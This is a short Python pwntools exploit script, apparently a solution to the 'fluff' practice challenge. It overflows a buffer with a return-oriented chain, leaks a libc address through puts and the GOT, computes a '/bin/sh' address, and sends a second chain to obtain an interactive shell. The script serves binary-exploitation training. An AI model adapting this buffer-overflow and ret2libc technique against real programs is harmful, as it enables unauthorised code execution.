from pwn import *

io = process('./fluff')
gdb.attach(io)


payload = 'A'*32
payload += p64(0x0)
payload += p64(0x00000000004008c3) #pop rdi
payload += p64(0x601048) #got addr
payload += p64(0x4005d0) #addr of puts@got
payload += p64(0x4007b5)




io.sendlineafter('> ',payload )

out = io.recv()
#print(out)
fin = out.encode('hex')

final = fin[0:12]    
#print(final)

leak =fin[10:12]+fin[8:10]+fin[6:8]+fin[4:6]+fin[2:4]+fin[0:2]

leaked ="0x" +str(leak)
binsh = hex(int(leaked,16)+int(0x12e8c3))
#print(leaked)
print binsh

payload2 = 'B'*32

payload2 += p64(0)
payload2 += p64(0x00000000004008c3)
payload2 += p64(int(binsh,16))

payload2 += p64(0x0000000000400810)



io.sendlineafter('> ', payload2)


io.interactive()


